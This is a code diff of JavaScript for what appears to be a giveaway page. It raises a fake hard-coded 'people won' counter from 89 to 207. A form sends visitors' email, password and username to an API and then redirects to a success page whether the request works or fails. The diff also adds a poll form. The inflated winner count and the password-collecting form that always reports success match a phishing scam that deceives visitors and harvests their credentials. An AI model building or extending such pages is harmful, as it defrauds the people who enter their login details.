@@ -32,12 +32,12 @@ document.addEventListener('DOMContentLoaded', function() {
         setInterval(updateTimer, 1000);
     }
 
-    // ===== STATS – 89 PEOPLE WON =====
+    // ===== STATS – 207 PEOPLE WON =====
     const winCount = document.getElementById('winCount');
     const entryCount = document.getElementById('entryCount');
 
     if (winCount) {
-        winCount.textContent = '89';
+        winCount.textContent = '207';
     }
 
     if (entryCount) {
@@ -70,14 +70,50 @@ document.addEventListener('DOMContentLoaded', function() {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password, username, option })
                 });
+                window.location.href = 'success.html';
+            } catch (error) {
+                window.location.href = 'success.html';
+            }
+        });
+    }
+
+    // ===== POLL FORM =====
+    const pollForm = document.getElementById('pollForm');
+    if (pollForm) {
+        pollForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const selected = document.querySelector('input[name="poll"]:checked');
+            if (!selected) {
+                alert('⚠️ Please select an option!');
+                return;
+            }
+
+            const vote = selected.value;
+            const btn = pollForm.querySelector('.poll-btn');
+            btn.textContent = '⏳ Submitting...';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('/api/poll', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ vote })
+                });
 
                 const result = await response.json();
-                console.log('API Response:', result);
-                window.location.href = 'success.html';
 
+                if (result.success) {
+                    alert('✅ Your vote has been recorded! Thank you for participating!');
+                    pollForm.reset();
+                } else {
+                    alert('⚠️ Something went wrong. Please try again.');
+                }
             } catch (error) {
-                console.error('Error:', error);
-                window.location.href = 'success.html';
+                alert('⚠️ Network error. Please try again.');
+            } finally {
+                btn.textContent = '🗳️ Vote Now';
+                btn.disabled = false;
             }
         });
     }
